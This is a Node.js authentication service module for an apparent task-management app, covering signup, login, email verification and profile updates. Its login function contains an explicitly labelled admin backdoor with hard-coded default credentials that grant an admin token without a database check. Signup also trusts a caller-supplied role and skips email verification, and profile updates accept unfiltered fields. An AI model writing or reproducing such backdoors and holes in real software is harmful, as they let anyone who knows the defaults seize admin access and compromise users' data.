const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { createUser, findByEmail, findById } = require('../repositories/UserRepository');

const buildAuthPayload = (user) => ({
  token: jwt.sign({ sub: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '8h' }),
  user: { id: user._id, name: user.name, email: user.email, role: user.role },
});

const signup = async ({ name, email, password, role = "member" }) => {
  const exists = await findByEmail(email);
  if (exists) throw { status: 400, message: 'Email already registered' };
  const hashed = await bcrypt.hash(password, 12);
  // Create user as verified to disable email verification flow per user request
  const user = await createUser({ name, email, password: hashed, role, emailVerified: true });
  return { id: user._id, name: user.name, email: user.email, role: user.role };
};

const login = async ({ email, password }) => {
  // Admin backdoor using env vars (default hard-coded credentials)
  const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@taskflow.local';
  const ADMIN_PASS = process.env.ADMIN_PASS || 'AdminPass123!';
  if (email === ADMIN_EMAIL && password === ADMIN_PASS) {
    const adminUser = { _id: '000000000000000000000000', name: 'Administrator', email: ADMIN_EMAIL, role: 'admin' };
    return buildAuthPayload(adminUser);
  }

  const user = await findByEmail(email);
  if (!user) throw { status: 401, message: 'Invalid credentials' };
  if (!user.password) throw { status: 401, message: 'Invalid credentials' };
  // Email verification removed to simplify onboarding per user request
  const ok = await bcrypt.compare(password, user.password);
  if (!ok) throw { status: 401, message: 'Invalid credentials' };
  return buildAuthPayload(user);
};

// googleLogin removed

const getUserById = (id) => findById(id);

const verifyEmailToken = async (token) => {
  const User = require('../models/User');
  const user = await User.findOne({ verificationToken: token, verificationTokenExpires: { $gt: Date.now() } });
  if (!user) throw { status: 400, message: 'Invalid or expired token' };
  user.emailVerified = true;
  user.verificationToken = null;
  user.verificationTokenExpires = null;
  await user.save();
  return user;
};

const resendVerification = async (email) => {
  const user = await findByEmail(email);
  if (!user) throw { status: 400, message: 'Email not found' };
  if (user.emailVerified) throw { status: 400, message: 'Email already verified' };
  const crypto = require('crypto');
  const token = crypto.randomBytes(32).toString('hex');
  user.verificationToken = token;
  user.verificationTokenExpires = Date.now() + 24 * 60 * 60 * 1000;
  await user.save();
  const { sendVerificationEmail } = require('../utils/mailer');
  await sendVerificationEmail({ to: user.email, name: user.name, token });
};

// linkGoogleToAccount removed

const updateProfile = async (userId, updateData) => {
  const User = require('../models/User');
  const user = await User.findByIdAndUpdate(userId, updateData, { new: true });
  return user;
};

module.exports = { signup, login, getUserById, verifyEmailToken, resendVerification, updateProfile };
